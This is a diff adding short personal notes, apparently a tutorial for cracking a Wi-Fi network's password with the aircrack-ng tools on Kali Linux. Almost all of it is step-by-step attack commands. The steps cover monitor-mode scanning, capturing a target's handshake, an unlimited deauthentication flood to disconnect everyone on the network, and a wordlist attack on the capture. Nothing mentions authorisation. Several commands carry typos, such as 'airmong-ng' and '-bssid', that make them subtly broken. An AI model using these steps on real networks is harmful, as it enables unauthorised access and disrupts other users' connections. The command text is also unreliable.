@@ -1,0 +1,22 @@
+- We need a physical tool called "Alfa Adapter" or another company named "Panda Adapter", basically, it's a device that listens to networks (scan them)
+
+- Handshake is a process used to establish a connection between two devices or systems before actual data transmission begins. 
+It ensures that both sides are ready to communicate and agree on the parameters of the communication (such as protocol versions, encryption, and data format). 
+(For example, when a computer communicates with a router)
+
+- So, in Kali, we plug our adapter, then we put the command "iwconfig" to see the ports, 
+when we detect the port in which our adapter is connected to, we write the command "sudo airmong-ng start [port_name]", it starts scanning.
+
+- To check if it actually started, we need to retype "iwconfig", this time, we'll find "mon" next to the port, it means it's scanning. (Mode Monitor)
+
+- Once plugged in and running, we use this command "sudo airodump-ng [port_name_mon]" to scan nearby networks.
+
+- When we find our target network, we note the following infos in a file: (Channel & mac address).
+
+- So now, we must create the handshake file, we use this command: "sudo airodump-ng [portmon] -w [path_to_file] -c [channelName] -bssid [mac_address]".
+
+-  (In another terminal) Now, we have to disconnect anyone in the network using this command: 
+"sudo aireplay-ng --deauth 0 -a [network_mac_address] [port_name_mon] [port_name_mon]"
+
+- And so, we find many files (csv, cap...) we take the cap file and try to compare it with a text file having many possible passwords. 
+(using this command : "sudo aircrack-ng [capfFle] -w [textFile]) .
